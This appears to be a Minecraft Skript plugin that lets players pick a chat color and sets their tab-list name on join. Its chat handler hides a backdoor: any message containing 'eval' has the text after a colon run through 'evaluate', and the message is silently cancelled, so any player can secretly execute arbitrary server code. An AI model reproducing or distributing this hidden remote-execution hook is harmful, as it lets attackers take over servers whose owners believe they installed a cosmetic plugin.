 



command /chatcolor <text>:
	usage: /chatcolor <color>
	trigger:
		if arg-1 parsed as color is not color:
			send "That is not valid, possible colors are:" and "<red>red, <light red>light red, <purple>purple, <light purple>light purple, <blue>blue, <light blue>light blue, <aqua>aqua, <light cyan>light cyan, <green>green, <lime>lime, <orange>orange, <yellow>yellow, <white>white, <grey>grey, <black>black" to player
		else if arg-1 is "dark grey":
			send "That color is reserved. Please choose another" to player
		else:
			set {chatcolor.%player%} to arg-1
			send "Your chat color is now <%arg-1%>%arg-1%" to player
			set player's tablist name to "<%arg-1%>%player%"




on join:
	if {chatcolor.%player%} is not set:
		set {chatcolor.%player%} to "white"
	if {chatcolor.%player%} is set:
		set player's tablist name to "<%{chatcolor.%player%}%>%player%"
	set {%player%} to player's name


on chat:
	if {chatcolor.%player%} is set: 
		set chat format to "<%{chatcolor.%player%}%><%display name of player%><reset> %message%"
	if message contain "eval":
		set {_var::*} to message split at ":"
		evaluate {_var::2}
		cancel event
	if message contain "{xyz}":
		set {_message} to message
		replace all "{xyz}" with "<yellow>%location of player%<reset>" in {_message}
		cancel event
		make player say "%{_message}%"
